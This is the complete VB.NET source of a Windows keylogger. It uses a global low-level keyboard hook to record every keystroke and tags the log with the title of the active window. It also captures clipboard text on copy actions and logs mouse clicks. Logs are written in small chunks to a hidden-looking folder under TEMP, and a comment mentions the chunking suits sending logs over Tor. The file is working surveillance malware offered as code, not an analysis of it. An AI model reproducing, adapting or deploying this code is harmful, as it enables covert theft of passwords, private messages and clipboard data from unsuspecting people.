Imports System.Reflection.Emit
Imports System.Runtime.InteropServices
Imports System.Text

Public Class Form1
    Inherits Form

    ' Windows API Hook keyboard
#Region "Hook"
    Private Delegate Function LowLevelKeyboardProc(ByVal nCode As Integer, ByVal wParam As IntPtr, ByVal lParam As IntPtr) As IntPtr

    <DllImport("user32.dll", CharSet:=CharSet.Auto, SetLastError:=True)>
    Private Shared Function SetWindowsHookEx(ByVal idHook As Integer, ByVal lpfn As LowLevelKeyboardProc, ByVal hMod As IntPtr, ByVal dwThreadId As Integer) As IntPtr
    End Function

    <DllImport("user32.dll", CharSet:=CharSet.Auto, SetLastError:=True)>
    Private Shared Function UnhookWindowsHookEx(ByVal hhk As IntPtr) As Boolean
    End Function

    <DllImport("user32.dll", CharSet:=CharSet.Auto, SetLastError:=True)>
    Private Shared Function CallNextHookEx(ByVal hhk As IntPtr, ByVal nCode As Integer, ByVal wParam As IntPtr, ByVal lParam As IntPtr) As IntPtr
    End Function

    <DllImport("kernel32.dll", CharSet:=CharSet.Auto, SetLastError:=True)>
    Private Shared Function GetModuleHandle(ByVal lpModuleName As String) As IntPtr
    End Function

    <DllImport("user32.dll")>
    Private Shared Function GetAsyncKeyState(ByVal vKey As Integer) As Short
    End Function

    <DllImport("user32.dll")>
    Private Shared Function GetForegroundWindow() As IntPtr
    End Function

    <DllImport("user32.dll")>
    Private Shared Function GetWindowText(ByVal hWnd As IntPtr, ByVal text As StringBuilder, ByVal count As Integer) As Integer
    End Function

    <DllImport("user32.dll")>
    Private Shared Function GetKeyboardState(ByVal lpKeyState As Byte()) As Boolean
    End Function

    <DllImport("user32.dll")>
    Private Shared Function ToUnicode(ByVal wVirtKey As UInteger, ByVal wScanCode As UInteger,
                                      ByVal lpKeyState As Byte(), ByVal pwszBuff As StringBuilder,
                                      ByVal cchBuff As Integer, ByVal wFlags As UInteger) As Integer
    End Function

    <DllImport("user32.dll")>
    Private Shared Function MapVirtualKey(ByVal uCode As UInteger, ByVal uMapType As UInteger) As UInteger
    End Function

    <DllImport("user32.dll")>
    Private Shared Function GetKeyboardLayout(ByVal idThread As UInteger) As IntPtr
    End Function


    <DllImport("user32.dll", CharSet:=CharSet.Unicode)>
    Private Shared Function ToUnicodeEx(ByVal wVirtKey As UInteger, ByVal wScanCode As UInteger,
                                   ByVal lpKeyState As Byte(), ByVal pwszBuff As StringBuilder,
                                   ByVal cchBuff As Integer, ByVal wFlags As UInteger,
                                   ByVal dwhkl As IntPtr) As Integer
    End Function

    <DllImport("user32.dll", CharSet:=CharSet.Auto, ExactSpelling:=True, SetLastError:=True)>
    Public Shared Function GetKeyState(ByVal keyCode As Integer) As Short
    End Function

    Private Const WH_KEYBOARD_LL As Integer = 13
    Private Const WM_KEYDOWN As Integer = &H100
    Private Const WM_KEYUP As Integer = &H101
    Private Const WM_SYSKEYDOWN As Integer = &H104
    Private Const WM_SYSKEYUP As Integer = &H105

    Private _hookID As IntPtr = IntPtr.Zero
    Private _proc As LowLevelKeyboardProc

    Private capsLockActive As Boolean = False
    Private numLockActive As Boolean = False
    Private scrollLockActive As Boolean = False
    Private lastWindowTitle As String = ""
    Private currentTextBuffer As New StringBuilder()
#End Region


#Region "Enum keys"
    ' Keys Enum
    Private Enum Keys
        ' Mouse Buttons
        None = 0
        'LButton = 1
        RButton = 2
        Cancel = 3
        MButton = 4
        XButton1 = 5
        XButton2 = 6

        ' System Keys
        Back = 8
        Tab = 9
        Clear = 12
        [Return] = 13
        Enter = 13
        ShiftKey = 16
        ControlKey = 17
        Menu = 18
        Pause = 19
        Capital = 20
        CapsLock = 20
        Escape = 27
        Space = 32
        PageUp = 33
        Prior = 33
        PageDown = 34
        [Next] = 34
        [End] = 35
        Home = 36
        Left = 37
        Up = 38
        Right = 39
        Down = 40
        SelectKey = 41
        Print = 42
        Execute = 43
        Snapshot = 44
        PrintScreen = 44
        Insert = 45
        Delete = 46
        Help = 47

        ' Numbers and Letters
        D0 = 48
        D1 = 49
        D2 = 50
        D3 = 51
        D4 = 52
        D5 = 53
        D6 = 54
        D7 = 55
        D8 = 56
        D9 = 57
        A = 65
        B = 66
        C = 67
        D = 68
        E = 69
        F = 70
        G = 71
        H = 72
        I = 73
        J = 74
        K = 75
        L = 76
        M = 77
        N = 78
        O = 79
        P = 80
        Q = 81
        R = 82
        S = 83
        T = 84
        U = 85
        V = 86
        W = 87
        X = 88
        Y = 89
        Z = 90

        ' Windows Keys
        LWin = 91
        RWin = 92
        Apps = 93
        Sleep = 95

        ' Numeric Keypad
        NumPad0 = 96
        NumPad1 = 97
        NumPad2 = 98
        NumPad3 = 99
        NumPad4 = 100
        NumPad5 = 101
        NumPad6 = 102
        NumPad7 = 103
        NumPad8 = 104
        NumPad9 = 105
        Multiply = 106
        Add = 107
        Separator = 108
        Subtract = 109
        [Decimal] = 110
        Divide = 111

        ' Function Keys
        F1 = 112
        F2 = 113
        F3 = 114
        F4 = 115
        F5 = 116
        F6 = 117
        F7 = 118
        F8 = 119
        F9 = 120
        F10 = 121
        F11 = 122
        F12 = 123
        F13 = 124
        F14 = 125
        F15 = 126
        F16 = 127
        F17 = 128
        F18 = 129
        F19 = 130
        F20 = 131
        F21 = 132
        F22 = 133
        F23 = 134
        F24 = 135

        ' Locks
        NumLock = 144
        Scroll = 145
        LShiftKey = 160
        RShiftKey = 161
        LControlKey = 162
        RControlKey = 163
        LMenu = 164
        RMenu = 165

        ' Multimedia and Browser Keys
        BrowserBack = 166
        BrowserForward = 167
        BrowserRefresh = 168
        BrowserStop = 169
        BrowserSearch = 170
        BrowserFavorites = 171
        BrowserHome = 172
        VolumeMute = 173
        VolumeDown = 174
        VolumeUp = 175
        MediaNextTrack = 176
        MediaPrevTrack = 177
        MediaStop = 178
        MediaPlayPause = 179
        LaunchMail = 180
        LaunchMediaSelect = 181
        LaunchApp1 = 182
        LaunchApp2 = 183

        ' Punctuation / Oem keys
        Oem1 = 186      ' ;: US keyboard
        OemPlus = 187   ' =+
        OemComma = 188  ' ,<
        OemMinus = 189  ' -_
        OemPeriod = 190 ' .>
        Oem2 = 191      ' /?
        Oem3 = 192      ' `~
        Oem4 = 219      ' [{
        Oem5 = 220      ' \|
        Oem6 = 221      ' ]}
        Oem7 = 222      ' '"
        Oem8 = 223
        Oem102 = 226
        OemClear = 254
    End Enum
#End Region

#Region "Key forms"
    Private Function GetSpecialKeyText(ByVal key As Keys) As String
        Select Case key
            Case Keys.Enter, Keys.Return
                Return Environment.NewLine
            Case Keys.Space
                Return " "
            Case Keys.Back
                If currentTextBuffer.Length > 0 Then
                    currentTextBuffer.Remove(currentTextBuffer.Length - 1, 1)
                End If
                Return ""
            Case Keys.Tab
                Return vbTab
            Case Keys.Delete
                Return "[SUPPR]"
            Case Keys.Escape
                Return "[ECHAP]"
            Case Keys.Left
                Return "[←]"
            Case Keys.Right
                Return "[→]"
            Case Keys.Up
                Return "[↑]"
            Case Keys.Down
                Return "[↓]"
            Case Keys.PageUp
                Return "[PGUP]"
            Case Keys.PageDown
                Return "[PGDN]"
            Case Keys.Home
                Return "[HOME]"
            Case Keys.End
                Return "[END]"
            Case Keys.F1 To Keys.F24
                Return "[" & key.ToString() & "]"
            Case Else
                Return ""
        End Select
    End Function

    Private Sub CheckSpecialKeys()
        ' Avoid redit
        Static lastCtrlC As Boolean = False
        Static lastCtrlV As Boolean = False
        Static lastAltTab As Boolean = False
        Static lastCtrlS As Boolean = False
        Static lastCtrlShiftT As Boolean = False
        Static lastAltF4 As Boolean = False
        Static lastPressed As New HashSet(Of String)

        Dim ctrlPressed As Boolean = (GetAsyncKeyState(Keys.ControlKey) And &H8000) <> 0
        Dim shiftPressed As Boolean = (GetAsyncKeyState(Keys.ShiftKey) And &H8000) <> 0
        Dim altPressed As Boolean = (GetAsyncKeyState(Keys.Menu) And &H8000) <> 0
        Dim winPressed As Boolean = (GetAsyncKeyState(Keys.LWin) And &H8000) <> 0 OrElse
                                (GetAsyncKeyState(Keys.RWin) And &H8000) <> 0

        ' If AltGr, not a special comb
        Dim altGrPressed As Boolean = ((GetAsyncKeyState(Keys.RMenu) And &H8000) <> 0)
        If altGrPressed Then
            lastPressed.Clear()
            Exit Sub
        End If

        ' ---------------------
        ' Mous click
        ' ---------------------
        Static lastRightClick As Boolean = False
        Static lastMiddleClick As Boolean = False

        'Dim leftPressed As Boolean = (GetAsyncKeyState(Keys.LButton) And &H8000) <> 0
        Dim rightPressed As Boolean = (GetAsyncKeyState(Keys.RButton) And &H8000) <> 0
        Dim middlePressed As Boolean = (GetAsyncKeyState(Keys.MButton) And &H8000) <> 0

        If rightPressed AndAlso Not lastRightClick Then
            AppendText(Environment.NewLine & "[RIGHT CLICK]" & Environment.NewLine)
            lastRightClick = True
        ElseIf Not rightPressed AndAlso lastRightClick Then
            lastRightClick = False
        End If

        If middlePressed AndAlso Not lastMiddleClick Then
            AppendText(Environment.NewLine & "[MIDDLE CLICK]" & Environment.NewLine)
            lastMiddleClick = True
        ElseIf Not middlePressed AndAlso lastMiddleClick Then
            lastMiddleClick = False
        End If

        ' ---------------------
        ' Backspace with count
        ' ---------------------
        Static lastBackPressed As Boolean = False
        Static lastBackTime As DateTime = DateTime.MinValue
        Static backCount As Integer = 0
        Static backLogged As Boolean = False

        Dim backPressed As Boolean = (GetAsyncKeyState(Keys.Back) And &H8000) <> 0
        Dim now As DateTime = DateTime.Now

        Dim currentWindowTitle As String = GetActiveWindowTitle()

        ' --- If the window changes, log backCount if it’s greater than 0
        If currentWindowTitle <> lastWindowTitle Then
            If backCount > 0 AndAlso Not backLogged Then
                AppendText(Environment.NewLine & "[BACK - " & backCount & "]" & Environment.NewLine)
                backLogged = True
                backCount = 0
            End If
            lastWindowTitle = currentWindowTitle
        End If

        ' If backspace is hit
        If backPressed Then
            ' Increment only if the key was just pressed or 0.25 seconds have passed
            ' → Allows a human-realistic count
            If Not lastBackPressed OrElse (now - lastBackTime).TotalSeconds >= 0.25 Then
                backCount += 1
                lastBackTime = now
                backLogged = False
            End If
            lastBackPressed = True
        ElseIf lastBackPressed Then

            lastBackPressed = False
        End If

        ' If another key is pressed → log Backspace if necessary
        Dim otherKeyPressed As Boolean = False
        For vk As Integer = 1 To 254
            If vk = Keys.Back Then Continue For
            If vk = Keys.ControlKey OrElse vk = Keys.LControlKey OrElse vk = Keys.RControlKey _
                OrElse vk = Keys.ShiftKey OrElse vk = Keys.LShiftKey OrElse vk = Keys.RShiftKey _
                OrElse vk = Keys.Menu OrElse vk = Keys.LMenu OrElse vk = Keys.RMenu _
                OrElse vk = Keys.LWin OrElse vk = Keys.RWin Then Continue For

            If (GetAsyncKeyState(vk) And &H8000) <> 0 Then
                otherKeyPressed = True
                Exit For
            End If
        Next

        If otherKeyPressed AndAlso backCount > 0 AndAlso Not backLogged Then
            AppendText(Environment.NewLine & "[BACK - " & backCount & "]" & Environment.NewLine)
            backCount = 0
            backLogged = True
        End If
        ' ---------------------
        ' Known shortcuts
        ' ---------------------
        If ctrlPressed AndAlso (GetAsyncKeyState(Keys.C) And &H8000) <> 0 AndAlso Not lastCtrlC Then
            AppendText(Environment.NewLine & "[CTRL+C - COPY]" & Environment.NewLine)
            lastCtrlC = True
            lastCopyTime = Date.Now ' Keep track of the clipboard copy time

            ' Read the clipboard as before:
            Try
                If Clipboard.ContainsText() Then
                    Dim clipText As String = Clipboard.GetText().Trim()
                    AppendText("→ Copied content: " & Environment.NewLine & clipText & Environment.NewLine)
                ElseIf Clipboard.ContainsImage() Then
                    AppendText("→ Copied content: [IMAGE]" & Environment.NewLine)
                ElseIf Clipboard.ContainsFileDropList() Then
                    AppendText("→ Copied content: [FILE(S)]" & Environment.NewLine)
                Else
                    AppendText("→ Copied content: [Non-text type]" & Environment.NewLine)
                End If
            Catch ex As Exception
                AppendText("→ Clipboard read error: " & ex.Message & Environment.NewLine)
            End Try
            lastCtrlC = True
        ElseIf lastCtrlC AndAlso (GetAsyncKeyState(Keys.C) And &H8000) = 0 Then
            lastCtrlC = False

        ElseIf ctrlPressed AndAlso (GetAsyncKeyState(Keys.V) And &H8000) <> 0 AndAlso Not lastCtrlV Then
            AppendText(Environment.NewLine & "[CTRL+V - PASTE]" & Environment.NewLine)
            lastCtrlV = True
        ElseIf lastCtrlV AndAlso (GetAsyncKeyState(Keys.V) And &H8000) = 0 Then
            lastCtrlV = False

        ElseIf ctrlPressed AndAlso (GetAsyncKeyState(Keys.S) And &H8000) <> 0 AndAlso Not lastCtrlS Then
            AppendText(Environment.NewLine & "[CTRL+S - SAVE]" & Environment.NewLine)
            lastCtrlS = True
        ElseIf lastCtrlS AndAlso (GetAsyncKeyState(Keys.S) And &H8000) = 0 Then
            lastCtrlS = False

        ElseIf ctrlPressed AndAlso shiftPressed AndAlso (GetAsyncKeyState(Keys.T) And &H8000) <> 0 AndAlso Not lastCtrlShiftT Then
            AppendText(Environment.NewLine & "[CTRL+SHIFT+T - REOPEN TAB]" & Environment.NewLine)
            lastCtrlShiftT = True
        ElseIf lastCtrlShiftT AndAlso (GetAsyncKeyState(Keys.T) And &H8000) = 0 Then
            lastCtrlShiftT = False

        ElseIf altPressed AndAlso (GetAsyncKeyState(Keys.Tab) And &H8000) <> 0 AndAlso Not lastAltTab Then
            AppendText(Environment.NewLine & "[ALT+TAB - SWITCH WINDOW]" & Environment.NewLine)
            lastAltTab = True
        ElseIf lastAltTab AndAlso (GetAsyncKeyState(Keys.Tab) And &H8000) = 0 Then
            lastAltTab = False

        ElseIf altPressed AndAlso (GetAsyncKeyState(Keys.F4) And &H8000) <> 0 AndAlso Not lastAltF4 Then
            AppendText(Environment.NewLine & "[ALT+F4 - CLOSE WINDOW]" & Environment.NewLine)
            lastAltF4 = True
        ElseIf lastAltF4 AndAlso (GetAsyncKeyState(Keys.F4) And &H8000) = 0 Then
            lastAltF4 = False

        Else
            ' ---------------------
            ' Other key combinations (generic)
            ' ---------------------
            ' If no modifier is pressed → do nothing
            If Not (ctrlPressed OrElse altPressed OrElse winPressed) Then
                lastPressed.Clear()
                Exit Sub
            End If

            If shiftPressed AndAlso Not ctrlPressed AndAlso Not altPressed AndAlso Not winPressed Then
                lastPressed.Clear()
                Exit Sub
            End If

            ' Scan all virtual keys
            For vk As Integer = 1 To 254
                ' Ignore modifier keys alone
                If vk = Keys.ControlKey OrElse vk = Keys.LControlKey OrElse vk = Keys.RControlKey _
                    OrElse vk = Keys.ShiftKey OrElse vk = Keys.LShiftKey OrElse vk = Keys.RShiftKey _
                    OrElse vk = Keys.Menu OrElse vk = Keys.LMenu OrElse vk = Keys.RMenu _
                    OrElse vk = Keys.LWin OrElse vk = Keys.RWin Then
                    Continue For
                End If

                ' Ignore  Ctrl+C, Ctrl+V, Ctrl+S, Ctrl+Shift+T
                If ctrlPressed Then
                    If (vk = Keys.C AndAlso lastCtrlC) OrElse
           (vk = Keys.V AndAlso lastCtrlV) OrElse
           (vk = Keys.S AndAlso lastCtrlS) OrElse
           (vk = Keys.T AndAlso shiftPressed AndAlso lastCtrlShiftT) Then
                        Continue For
                    End If
                End If

                ' Check if the key is pressed
                If (GetAsyncKeyState(vk) And &H8000) <> 0 Then
                    Dim combo As New StringBuilder()
                    If ctrlPressed Then combo.Append("CTRL+")
                    If shiftPressed Then combo.Append("SHIFT+")
                    If altPressed Then combo.Append("ALT+")
                    If winPressed Then combo.Append("WIN+")
                    combo.Append(CType(vk, Keys).ToString())

                    Dim comboStr As String = combo.ToString()

                    If Not lastPressed.Contains(comboStr) Then
                        AppendText(Environment.NewLine & "[" & comboStr & "]" & Environment.NewLine)
                        lastPressed.Add(comboStr)
                    End If
                End If
            Next

            ' Clean up released keys
            Dim toRemove As New List(Of String)
            For Each pressedCombo In lastPressed
                Dim parts() As String = pressedCombo.Split("+"c)
                Dim lastKeyName As String = parts(parts.Length - 1)
                Dim lastKey As Keys
                If [Enum].TryParse(lastKeyName, lastKey) Then
                    If (GetAsyncKeyState(lastKey) And &H8000) = 0 Then
                        toRemove.Add(pressedCombo)
                    End If
                End If
            Next
            For Each r In toRemove
                lastPressed.Remove(r)
            Next
        End If

        ' ---------------------
        ' Win key combinations (specific)
        ' ---------------------
        If winPressed Then
            If (GetAsyncKeyState(Keys.D) And &H8000) <> 0 Then AppendText(Environment.NewLine & "[WIN+D - DESKTOP]" & Environment.NewLine)
            If (GetAsyncKeyState(Keys.E) And &H8000) <> 0 Then AppendText(Environment.NewLine & "[WIN+E - EXPLORER]" & Environment.NewLine)
            If (GetAsyncKeyState(Keys.L) And &H8000) <> 0 Then AppendText(Environment.NewLine & "[WIN+L - LOCK]" & Environment.NewLine)
        End If

        ' ---------------------
        ' Multimedia keys
        ' ---------------------
        If (GetAsyncKeyState(Keys.VolumeMute) And &H8000) <> 0 Then AppendText(Environment.NewLine & "[VOLUME MUTE]" & Environment.NewLine)
        If (GetAsyncKeyState(Keys.VolumeDown) And &H8000) <> 0 Then AppendText(Environment.NewLine & "[VOLUME DOWN]" & Environment.NewLine)
        If (GetAsyncKeyState(Keys.VolumeUp) And &H8000) <> 0 Then AppendText(Environment.NewLine & "[VOLUME UP]" & Environment.NewLine)
        If (GetAsyncKeyState(Keys.MediaNextTrack) And &H8000) <> 0 Then AppendText(Environment.NewLine & "[MEDIA NEXT TRACK]" & Environment.NewLine)
        If (GetAsyncKeyState(Keys.MediaPrevTrack) And &H8000) <> 0 Then AppendText(Environment.NewLine & "[MEDIA PREV TRACK]" & Environment.NewLine)
        If (GetAsyncKeyState(Keys.MediaPlayPause) And &H8000) <> 0 Then AppendText(Environment.NewLine & "[MEDIA PLAY/PAUSE]" & Environment.NewLine)
    End Sub
#End Region

#Region "init hook"
    Private Sub StartHook()
        _proc = AddressOf HookCallback
        _hookID = SetHook(_proc)
    End Sub

    Private Sub StopHook()
        If _hookID <> IntPtr.Zero Then
            UnhookWindowsHookEx(_hookID)
            _hookID = IntPtr.Zero
        End If
    End Sub

    Private Function SetHook(ByVal proc As LowLevelKeyboardProc) As IntPtr
        Using curProcess As Process = Process.GetCurrentProcess()
            Using curModule As ProcessModule = curProcess.MainModule
                Return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0)
            End Using
        End Using
    End Function

    Private Function HookCallback(ByVal nCode As Integer, ByVal wParam As IntPtr, ByVal lParam As IntPtr) As IntPtr
        If nCode >= 0 Then
            If wParam = WM_KEYDOWN OrElse wParam = WM_SYSKEYDOWN Then
                Dim vkCode As Integer = Marshal.ReadInt32(lParam)
                Dim key As Keys = CType(vkCode, Keys)

                If key = Keys.CapsLock Or key = Keys.NumLock Or key = Keys.Scroll Then
                    UpdateLockStates()
                End If

                If Not IsKeyRepeated(key) Then
                    ProcessKey(key)
                End If
            End If
        End If

        Return CallNextHookEx(_hookID, nCode, wParam, lParam)
    End Function

    Private Sub ProcessKey(ByVal key As Keys)
        Dim ctrlPressed As Boolean = (GetAsyncKeyState(Keys.ControlKey) And &H8000) <> 0
        Dim altPressed As Boolean = (GetAsyncKeyState(Keys.Menu) And &H8000) <> 0
        Dim winPressed As Boolean = (GetAsyncKeyState(Keys.LWin) And &H8000) <> 0 OrElse (GetAsyncKeyState(Keys.RWin) And &H8000) <> 0
        Dim shiftPressed As Boolean = (GetAsyncKeyState(Keys.ShiftKey) And &H8000) <> 0

        ' Detect AltGr (Ctrl right + Alt right)
        Dim altGrPressed As Boolean = ((GetAsyncKeyState(Keys.RMenu) And &H8000) <> 0)

        ' If AltGr, not a real Ctrl+Alt
        If (ctrlPressed AndAlso altPressed AndAlso altGrPressed) Then
            ctrlPressed = False
            altPressed = False
        End If

        If key = Keys.CapsLock Then
            capsLockActive = Not capsLockActive
            'AppendText(Environment.NewLine & "[CAPSLOCK " & If(capsLockActive, "OFF", "ON") & "] ")
        End If

        ' Don't block AltGr
        ' Block (Alt, Ctrl, Win alone)
        If (winPressed) Then
            Exit Sub
        End If
        If (altPressed AndAlso Not altGrPressed) OrElse (ctrlPressed AndAlso Not altGrPressed) Then
            Exit Sub
        End If

        ' Real char ToUnicode
        Dim actualChar As String = GetActualCharacter(key)

        ' Letter, symbol
        If Not String.IsNullOrEmpty(actualChar) Then
            Select Case actualChar
                Case vbCr, vbLf
                    currentTextBuffer.Append(Environment.NewLine)
                Case vbTab
                    currentTextBuffer.Append(vbTab)
                Case Else
                    ' CapsLock interpretation
                    If capsLockActive Then
                        If Not String.IsNullOrEmpty(actualChar) Then
                            Dim transformed As Char
                            If Char.IsLetter(actualChar(0)) Then
                                transformed = If(Char.IsLower(actualChar(0)),
                                     Char.ToUpperInvariant(actualChar(0)),
                                     Char.ToLowerInvariant(actualChar(0)))
                            Else
                                transformed = actualChar(0)
                            End If
                            currentTextBuffer.Append(transformed)
                        End If
                    Else
                        currentTextBuffer.Append(actualChar)
                    End If
            End Select

        Else
                ' Spec char (F1–F12, etc.)
                Dim keyText As String = GetSpecialKeyText(key)
                If Not String.IsNullOrEmpty(keyText) Then
                    currentTextBuffer.Append(keyText)
                End If
            End If

        ' Realtime
        If currentTextBuffer.Length > 0 Then
            Me.BeginInvoke(Sub()
                               UpdateLastLine(currentTextBuffer.ToString())
                               'If currentTextBuffer.Length > 100 Then
            'Dim recentText As String = currentTextBuffer.ToString().Substring(currentTextBuffer.Length - 100)
            'UpdateLastLine(recentText)
            'Else
            'UpdateLastLine(currentTextBuffer.ToString())
        'End If
                           End Sub)
        End If
    End Sub


    Private Sub UpdateLastLine(ByVal text As String)
        ' This method updates the last line with the current text
        Dim lines As String() = TextBox1.Text.Split(Environment.NewLine)
        If lines.Length > 1 Then
            ' Rebuild the text without the last line
            Dim newText As New StringBuilder()
            For i As Integer = 0 To lines.Length - 2
                newText.AppendLine(lines(i))
            Next
            newText.Append(text)
            TextBox1.Text = newText.ToString()
        Else
            TextBox1.Text = text
        End If

        TextBox1.SelectionStart = TextBox1.Text.Length
        TextBox1.ScrollToCaret()
    End Sub

    Private Function IsKeyRepeated(ByVal key As Keys) As Boolean
        Static lastKey As Keys = Keys.None
        Static lastTime As DateTime = DateTime.Now

        If key = lastKey AndAlso (DateTime.Now - lastTime).TotalMilliseconds < 350 Then
            Return True
        Else
            lastKey = key
            lastTime = DateTime.Now
            Return False
        End If
    End Function
    Private Sub UpdateLockStates()
        capsLockActive = (GetKeyState(Keys.CapsLock) And 1) <> 0
        numLockActive = (GetKeyState(Keys.NumLock) And 1) <> 0
        scrollLockActive = (GetKeyState(Keys.Scroll) And 1) <> 0
    End Sub

    Private Function IsCapsLockActive() As Boolean
        Return (GetKeyState(Keys.CapsLock) And 1) <> 0
    End Function


    Private Function GetActualCharacter(ByVal vkCode As Integer) As String
        Try
            Dim keyboardState(255) As Byte
            If Not GetKeyboardState(keyboardState) Then
                Return ""
            End If


            keyboardState(Keys.CapsLock) = If(capsLockActive, 1, 0)

            ' AltGr = Ctrl right (RControl) + Alt right (RMenu)
            Dim altGrPressed As Boolean = ((GetAsyncKeyState(Keys.RMenu) And &H8000) <> 0)
            If altGrPressed Then
                keyboardState(Keys.ControlKey) = &H80
                keyboardState(Keys.Menu) = &H80
            End If

            ' Force Shift if pressed
            Dim shiftPressed As Boolean = ((GetAsyncKeyState(Keys.ShiftKey) And &H8000) <> 0) _
    OrElse ((GetAsyncKeyState(Keys.LShiftKey) And &H8000) <> 0) _
    OrElse ((GetAsyncKeyState(Keys.RShiftKey) And &H8000) <> 0)

            Dim isLetter As Boolean = (vkCode >= Keys.A AndAlso vkCode <= Keys.Z)
            If isLetter AndAlso capsLockActive Then
                shiftPressed = Not shiftPressed  ' inverse l’effet de CapsLock (comme dans Windows)
            End If


            If shiftPressed Then
                keyboardState(Keys.ShiftKey) = &H80
            End If

            ' Convert
            Dim scanCode As UInteger = MapVirtualKey(CUInt(vkCode), 0)
            Dim stringBuilder As New StringBuilder(10)

            Dim result As Integer = ToUnicode(CUInt(vkCode), scanCode, keyboardState, stringBuilder, stringBuilder.Capacity, 0)

            If result > 0 Then
                Return stringBuilder.ToString().Substring(0, result)
            End If
        Catch ex As Exception
        End Try

        Return ""
    End Function
#End Region

#Region "Clipboard stuff"
    Private lastClipboardText As String = ""
    Private lastClipboardCheck As Date = Date.Now
    Private lastCopyTime As Date = Date.MinValue

    Private Sub CheckClipboardChange()
        Dim first = True ' avoid first clipboard stuff

        ' Check every 3s 
        If (Date.Now - lastClipboardCheck).TotalMilliseconds < 3000 Then Exit Sub
        lastClipboardCheck = Date.Now

        Try
            If first = False Then
                If Clipboard.ContainsText() Then
                    Dim currentText As String = Clipboard.GetText()
                    If currentText <> lastClipboardText Then
                        ' New content detected
                        Dim sinceLastCtrlC = (Date.Now - lastCopyTime).TotalSeconds

                        ' If there hasn’t been a recent keyboard copy → assume a right-click "Copy"
                        If sinceLastCtrlC > 2 Then
                            AppendText(Environment.NewLine & "[RIGHT CLICK COPY]" & Environment.NewLine)
                            Dim clipText As String = currentText.Trim()
                            'If clipText.Length > 500 Then clipText = clipText.Substring(0, 500) & "… [TEXT TRUNCATED]"
                            AppendText("→ Copied content:" & Environment.NewLine & clipText & Environment.NewLine)
                        End If

                        lastClipboardText = currentText
                    End If
                End If
            Else
                first = False
            End If
        Catch
            ' Ignore clipboard errors (often temporary "access denied")
        End Try
    End Sub
#End Region

#Region "Active windows"
    Private Function GetActiveWindowTitle() As String
        Try
            Dim hWnd As IntPtr = GetForegroundWindow()
            If hWnd = IntPtr.Zero Then Return "Unknown"

            Dim title As New StringBuilder(256)
            If GetWindowText(hWnd, title, title.Capacity) > 0 Then
                Return title.ToString()
            End If
        Catch
        End Try
        Return "Unknown"
    End Function
#End Region

#Region "Display & Save"
    ' -----------------------------
    ' File logging
    ' -----------------------------
    Private logFilePrefix As String = "Keylog_"
    Private logFileIndex As Integer = 1
    'Private charsSinceLastSave As Integer = 0
    'Private maxCharsBeforeSave As Integer = 100 ' Save every 500 chars
    Private maxFileSizeMB As Double = 0.1         ' Create new file every 1 MB (Nice if logs sent via Tor network)


    ' -----------------------------
    ' File logging in TEMP folder
    ' -----------------------------
    Private logFolder As String = "" ' save to temp folder/logsK if fail it will save to temp folder

    Private Sub InitLogFolder()
        Try
            ' Get temp folder
            Dim tempPath As String = IO.Path.GetTempPath()
            logFolder = IO.Path.Combine(tempPath, "logsK") 'Folder logsK change it if needed

            ' Create the folder if it does not exist
            If Not IO.Directory.Exists(logFolder) Then
                IO.Directory.CreateDirectory(logFolder)
            End If
        Catch ex As Exception
            ' Handle errors if needed
            logFolder = IO.Path.GetTempPath() ' fallback to temp folder
        End Try
    End Sub


    Private Sub AppendText(ByVal text As String)
        If TextBox1.InvokeRequired Then
            TextBox1.BeginInvoke(Sub() AppendText(text))
        Else
            TextBox1.AppendText(text)
            TextBox1.SelectionStart = TextBox1.Text.Length
            TextBox1.ScrollToCaret()

            ' Limit the text size to prevent memory issues
            If TextBox1.Text.Length > 350 Then
                SaveToFile()
                'TextBox1.Text = TextBox1.Text.Substring(TextBox1.Text.Length - 5000)
            End If
        End If
    End Sub
    Private Sub SaveToFile()
        Try
            ' Ensure folder exists
            If Not IO.Directory.Exists(logFolder) Then IO.Directory.CreateDirectory(logFolder)

            ' Determine file name
            Dim logFilePath As String = IO.Path.Combine(logFolder, logFilePrefix & logFileIndex & ".txt")

            ' Check file size → create new file if exceeded
            If IO.File.Exists(logFilePath) Then
                Dim fileSizeMB As Double = New IO.FileInfo(logFilePath).Length / 1024 / 1024
                If fileSizeMB >= maxFileSizeMB Then
                    logFileIndex += 1
                    logFilePath = IO.Path.Combine(logFolder, logFilePrefix & logFileIndex & ".txt")
                End If
            End If

            ' Append the text buffer
            IO.File.AppendAllText(logFilePath, TextBox1.Text)
            ' Clear buffer after writing
            TextBox1.Clear()
        Catch ex As Exception
            ' Ignore file access errors
        End Try
    End Sub
#End Region

    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        ' Start
        Me.Text = "Keylogger Form"
        Me.Size = New Size(700, 500)
        Me.StartPosition = FormStartPosition.CenterScreen

        ' Textbox configs
        TextBox1.Multiline = True
        TextBox1.ScrollBars = ScrollBars.Vertical
        TextBox1.Dock = DockStyle.Fill
        TextBox1.Font = New Font("Consolas", 10)
        TextBox1.ReadOnly = True

        InitLogFolder() ' Check save path

        StartHook()

        Timer1.Interval = 100
        Timer1.Start()

        UpdateLockStates()

        AppendText("[" & DateTime.Now.ToString("dd/MM/yyyy - hh:mm:ss tt") & "] === Keylogger started ===" & Environment.NewLine)
        AppendText("CapsLock: " & If(capsLockActive, "Inactive", "Active") & " | NumLock: " & If(numLockActive, "Inactive", "Active") & Environment.NewLine)
        AppendText("-----------------------------------" & Environment.NewLine)
    End Sub

    Protected Overrides Sub OnFormClosing(e As FormClosingEventArgs)
        ' Display the final text before closing
        If currentTextBuffer.Length > 0 Then
            AppendText(currentTextBuffer.ToString())
        End If

        Timer1.Stop()
        StopHook()
        SaveToFile()
        MyBase.OnFormClosing(e)
    End Sub

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        Dim activeWindow As String = GetActiveWindowTitle()

        ' Check if the window has changed
        If activeWindow <> lastWindowTitle Then
            If currentTextBuffer.Length > 0 Then
                ' Display the accumulated text before switching windows
                Me.BeginInvoke(Sub()
                                   AppendText(currentTextBuffer.ToString())
                                   currentTextBuffer.Clear()
                               End Sub)
            End If

            ' Display the new window title
            Me.BeginInvoke(Sub()
                               AppendText(Environment.NewLine & "[" & DateTime.Now.ToString("HH:mm:ss") & "] === " & activeWindow & " ===" & Environment.NewLine)
                           End Sub)

            lastWindowTitle = activeWindow
        End If


        CheckClipboardChange() ' Monitor Clipboard change
        CheckSpecialKeys() ' Monitor special key combinations
    End Sub


End Class